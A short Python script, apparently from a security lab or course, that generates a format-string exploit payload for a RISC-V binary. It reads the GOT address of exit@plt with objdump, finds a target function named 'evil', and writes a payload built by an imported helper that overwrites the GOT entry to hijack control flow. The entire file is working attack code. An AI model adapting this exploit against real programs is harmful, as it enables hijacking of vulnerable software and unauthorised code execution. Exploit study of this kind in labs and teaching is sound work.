#!/usr/bin/env python3
import os
import sys
import subprocess as sp
from fsb import *

ROOT = os.path.dirname(__file__)
BIN_DIR = "%s/../../install/bin/" % ROOT
CROSS_COMPILE = "riscv64-unknown-linux-gnu-"
OBJDUMP = "%s/%sobjdump" % (BIN_DIR, CROSS_COMPILE)
GCC = "%s/%sgcc" % (BIN_DIR, CROSS_COMPILE)
BIN_BASE = 0x2aaaaaa000

OFFSET = 11

def sh(cmds):
    assert(os.spawnvp(os.P_WAIT, cmds[0], cmds) == 0)

def get_meta(prog):
    # get distance and address of got
    p = sp.Popen([OBJDUMP, "-D", prog], stdout=sp.PIPE)

    for line in p.stdout:
        if b"<exit@plt>:" in line:
            break;

    # skip
    p.stdout.readline()
    # GOT line
    line = p.stdout.readline().decode("utf-8")
    line = line.split("\t")[3] # operands
    dist, addr = line.split("#")

    addr = int(addr.strip().split(" ")[0], 16)
    return addr

if __name__ == '__main__':
    if len(sys.argv) < 2:
        print("usage : %s prog" % sys.argv[0])
        sys.exit(-1)

    prog = sys.argv[1]

    # build gcc
    addr = get_meta(prog) + BIN_BASE
    evil = nm(prog, "evil") + BIN_BASE
    print("ADDR : %016X" % addr)
    print("EVIL : %016X" % evil)

    f = open('payload', 'wb')
    f.write(build_payload(addr, evil, OFFSET))
    f.write(b"exit")
    f.close()
